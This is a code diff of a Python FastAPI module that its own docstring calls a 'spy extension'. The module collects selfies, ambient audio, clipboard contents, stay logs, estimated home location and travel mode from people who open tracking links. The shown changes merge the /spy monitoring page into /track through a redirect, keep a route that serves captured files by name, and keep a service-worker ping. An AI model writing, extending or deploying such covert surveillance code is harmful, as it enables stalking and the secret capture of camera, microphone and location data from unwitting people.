@@ -1,10 +1,15 @@
-"""スパイ拡張：自撮り・環境音・クリップボード・滞在ログ・拠点推定・移動手段。"""
+"""スパイ拡張：自撮り・環境音・クリップボード・滞在ログ・拠点推定・移動手段。
+
+v2:
+  ・画面は /track/{code} に合流（/spy/{code} はリダイレクト）
+  ・取得ファイル名で直接見られる /s/{code}/f/{name} を追加
+"""
 from __future__ import annotations
 
 import base64, datetime as dt, json, math, os, re, time
 
 from fastapi import APIRouter, Depends, HTTPException, Request
-from fastapi.responses import FileResponse, HTMLResponse
+from fastapi.responses import FileResponse, HTMLResponse, RedirectResponse
 
 from . import linktrack, tenancy
 from .tenancy import db
@@ -162,7 +167,6 @@ def cap_file(code: str, cid: int):
 
 @router.get("/s/{code}/f/{name}")
 def cap_name(code: str, name: str):
-    """ファイル名だけで取得（link_hits に保存した名前から直接見る用）。"""
     if not _owner(code):
         raise HTTPException(404)
     safe = os.path.basename(name)
@@ -193,7 +197,6 @@ def manifest():
 
 @router.get("/s/{code}/ping")
 def ping(code: str, request: Request, hit: int = 0, sid: str = ""):
-    """Service Worker からの生存確認。"""
     if not _owner(code):
         return {"ok": 0}
     return {"ok": 1, "server": _now()}
@@ -318,10 +321,11 @@ def api_spy(code: str):
     return _insight(code)
 
 
-@router.get("/spy/{code}", response_class=HTMLResponse)
+@router.get("/spy/{code}")
 def spy_page(code: str, request: Request, u=Depends(auth)):
-    link = db.link_get(code)
-    if not link:
+    """監視室は /track/{code} に統合したので、そちらへ送る。"""
+    if not _owner(code):
         raise HTTPException(404)
-    return _m().render("spy_view.html", request, code=code, link=link,
-                       base=_m()._base(request))
+    if not db.link_get(code):
+        raise HTTPException(404)
+    return RedirectResponse(f"/track/{code}", status_code=302)
